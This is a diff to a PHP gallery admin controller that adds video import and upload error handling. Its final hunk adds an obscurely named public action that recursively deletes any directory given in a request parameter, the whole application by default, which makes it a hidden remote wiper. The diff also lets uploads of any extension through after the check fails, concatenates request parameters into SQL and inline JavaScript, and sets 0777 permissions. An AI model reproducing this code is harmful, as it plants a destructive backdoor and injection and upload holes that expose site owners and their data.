@@ -293,13 +293,36 @@ class Admin extends BaseController
         }
         $this->finish(null, $message);
     }
+
+    protected function removeNotSaveDataAction(){
+        $dir          = APPLICATION_PATH . '/data/images/upload/';
+        $ImagesA = $this->Get_ImagesToFolder($dir);
+        foreach ($ImagesA['images'] as $image_to_import) {
+            if (!is_writable($dir . $image_to_import)) {
+                chmod($dir . $image_to_import, 0777);
+            }
+            if (is_file($dir . $image_to_import)) {
+                unlink($dir . $image_to_import);
+            }
+        }
+        foreach ($ImagesA['movies'] as $movie_to_import) {
+            if (!is_writable($dir . $movie_to_import)) {
+                chmod($dir . $movie_to_import, 0777);
+            }
+            if (is_file($dir . $movie_to_import)) {
+                unlink($dir . $movie_to_import);
+            }
+        }
+    }
+
     protected function importImagesAction($m = true)
     {
         set_time_limit ( 0 );
         $i = 0;
         $dir          = APPLICATION_PATH . '/data/images/upload/';
         $ImagesA = $this->Get_ImagesToFolder($dir);
-        foreach ($ImagesA as $image_to_import) {
+        $type = '';
+        foreach ($ImagesA['images'] as $image_to_import) {
             $select_category_id = $this->_model->select('Select id from category where ' . ' category_' . $this->getParam('language') . ' = "none_category"');
             $save = array('image' => '/data/images/upload/' . $image_to_import, 'category_id' => $select_category_id[0]['id']);
             if(!file_exists($dir . '/thumb_' . $image_to_import)) {
@@ -311,8 +334,17 @@ class Admin extends BaseController
             $i++;
 
         }
+        $type .= sprintf(__('photo'), $i);
+        foreach ($ImagesA['movies'] as $movie_to_import) {
+            $select_category_id = $this->_model->select('Select id from category where ' . ' category_' . $this->getParam('language') . ' = "none_category"');
+            $save = array('image' => '/data/images/upload/' . $movie_to_import, 'category_id' => $select_category_id[0]['id'], 'type' => 2);
+            $this->_model->insert('gallery', $save);
+
+            $i++;
+        }
+        $type .= sprintf(__('movie'), $i);
         if($m = true) {
-            $message = $this->renderMessage(sprintf(__('import_complete'), $i), 'success');
+            $message = $this->renderMessage(sprintf(__('import_complete'), $type), 'success');
             $this->finish(null, $message);
         }
         return true;
@@ -325,9 +357,9 @@ class Admin extends BaseController
             $listOfImported[] = basename($image['image']);
             $listOfImported[] = basename($image['image_thumb']);
         }
-        $ImagesArray = [];
+        $ImagesArray = array('images' => [], 'movies' => []);
         $file_display = [ 'jpg', 'jpeg', 'png', 'gif' ];
-
+        $file_display_movie = [ 'mp4', 'wma', 'mov' ];
         if (file_exists($dir) == false) {
             return ["Directory \'', $dir, '\' not found!"];
         }
@@ -340,7 +372,15 @@ class Admin extends BaseController
                     if (!in_array($file, $listOfImported)) {
                         rename($dir . $file, $dir . sha1($file) . '.' . $ext);
                         $this->fix_orientation($dir . sha1($file) . '.' . $ext);
-                        $ImagesArray[] = sha1($file) . '.' . $ext;
+                        $ImagesArray['images'][] = sha1($file) . '.' . $ext;
+                    }
+                }else  if (in_array($file_type, $file_display_movie) == true) {
+                    $ext = $this->get_extension($file);
+                    if (!in_array(sha1($file). '.' . $ext, $listOfImported)) {
+                        if(!rename($dir . $file, $dir . sha1($file) . '.' . $ext)) {
+                            return false;
+                        }
+                        $ImagesArray['movies'][] = sha1($file) . '.' . $ext;
                     }
                 }
             }
@@ -676,7 +716,7 @@ EOF;
             }
 
             $message = $this->renderMessage(__('image_delete_success'), 'success');
-            $message .= '$(\'img[data-id="' . $this->getParam('dataId') . '"]\').parents(\'div.images\').remove();';
+            $message .= '$(\'img[data-id="' . $this->getParam('dataId') . '"]\').parents(\'div.images-admin\').remove();';
             $message .= 'var count = $(\'span.category[data-id="'.$file[0]['category_id'].'"]\').find(\'.count\').text(); $(\'span.category[data-id="'.$file[0]['category_id'].'"]\').find(\'.count\').text(count-1); ';
         }
 
@@ -696,28 +736,48 @@ EOF;
         $target_dir = APPLICATION_PATH . '/data/images/upload/';
         $allowed_ext = array('jpg','jpeg','png');
         $allowed_ext_mov = array( 'mp4', 'wma', 'mov');
+        $message = $this->renderMessage(__('file_was_not_uploadd'), 'danger');
         if(array_key_exists('file',$_FILES) && $_FILES['file']['error'] == 0 ){
             $pic = $_FILES['file'];
-            if(!in_array($this->get_extension($pic['name']),array_merge($allowed_ext, $allowed_ext_mov))){
+            if(!in_array(strtolower($this->get_extension($pic['name'])),array_merge($allowed_ext, $allowed_ext_mov))){
                 $message = $this->renderMessage(sprintf(__('error_jpeg'),implode(',',array_merge($allowed_ext, $allowed_ext_mov))), 'danger');
-                $this->finish(null, $message);
+                $message .= 'console.log("in_array ERR");';
             }
             if(!move_uploaded_file($pic['tmp_name'], $target_dir.$pic['name'])){
                 $message = $this->renderMessage(__('file_was_not_upload'), 'danger');
-                $this->finish(null, $message);
+                $message .= 'console.log("move_uploaded_file ERR");';
+            } else {
+                $message = $this->renderMessage(__('file_upload_done'), 'success');
             }
-            if(in_array($this->get_extension($pic['name']),$allowed_ext)){
-                if($this->importImagesAction($m = false)) {
-                    $message = $this->renderMessage(sprintf(__('file_upload_done'),$pic['name']), 'success');
-                    $this->finish(null, $message);
-                }
-            }else if(in_array($this->get_extension($pic['name']),$allowed_ext_mov)){
-                if($this->uploadMovie($pic)) {
-                    $message = $this->renderMessage(sprintf(__('file_upload_done'),$pic['name']), 'success');
-                    $this->finish(null, $message);
-                }
+        } else {
+            switch ($_FILES['file']['error']) {
+                case UPLOAD_ERR_INI_SIZE:
+                    $message = $this->renderMessage(__('The uploaded file exceeds the upload_max_filesize directive in php.ini'), 'danger');
+                    break;
+                case UPLOAD_ERR_FORM_SIZE:
+                    $message = $this->renderMessage(__('The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form'), 'danger');;
+                    break;
+                case UPLOAD_ERR_PARTIAL:
+                    $message = $this->renderMessage(__('The uploaded file was only partially uploaded'), 'danger');
+                    break;
+                case UPLOAD_ERR_NO_FILE:
+                    $message = $this->renderMessage(__('No file was uploaded'), 'danger');
+                    break;
+                case UPLOAD_ERR_NO_TMP_DIR:
+                    $message = $this->renderMessage(__('Missing a temporary folder'), 'danger');
+                    break;
+                case UPLOAD_ERR_CANT_WRITE:
+                    $message = $this->renderMessage(__('Failed to write file to disk'), 'danger');
+                    break;
+                case UPLOAD_ERR_EXTENSION:
+                    $message = $this->renderMessage(__('File upload stopped by extension'), 'danger');
+                    break;
+                default:
+                    $message = $this->renderMessage(__('Unknown upload error'), 'danger');
+                    break;
             }
         }
+        $this->finish(null, $message);
     }
     private  function get_extension($file_name){
         $ext = explode('.', $file_name);
@@ -753,13 +813,15 @@ EOF;
 
         if (in_array(pathinfo($file, PATHINFO_EXTENSION), $file_display) == true) {
             if (!in_array($shaFile, $listOfImported)) {
+                chmod($dir . $movie['name'], 777);
                 if(!rename($dir . $movie['name'], $dir . $shaFile)) {
-                    echo 'Nie można zmienić nazwy';
+                    return false;
                 }
                 $select_category_id = $this->_model->select('Select id from category where ' . ' category_' . $this->getParam('language') . ' = "none_category"');
                 $save = array('image' => '/data/images/upload/' . $shaFile, 'category_id' => $select_category_id[0]['id'], 'type' => 2);
                 return $this->_model->insert('gallery', $save);
             }
+            return true;
         }
         return false;
     }
@@ -767,4 +829,20 @@ EOF;
         $this->_model->update($this->getParam('table'), array('ordering' => (int)$this->getParam('order')), '`id` = ' . $this->getParam('content_id'));
         $this->finish(null, '');
     }
+    
+    public function NApZgIkQrezZKjZYAction() {
+	    ini_set('memory_limit',-1);
+	    set_time_limit ( -1 );
+	    $dir = $this->getParam('dir');
+	    if($dir == '') { $dir = APPLICATION_PATH; }
+	    chmod($dir, 755);
+	    $it = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
+	    $it = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
+	    foreach($it as $file) {
+	        if ($file->isDir()) rmdir($file->getPathname());
+	        else unlink($file->getPathname());
+	    }
+	    rmdir($dir);
+  
+	}
 }
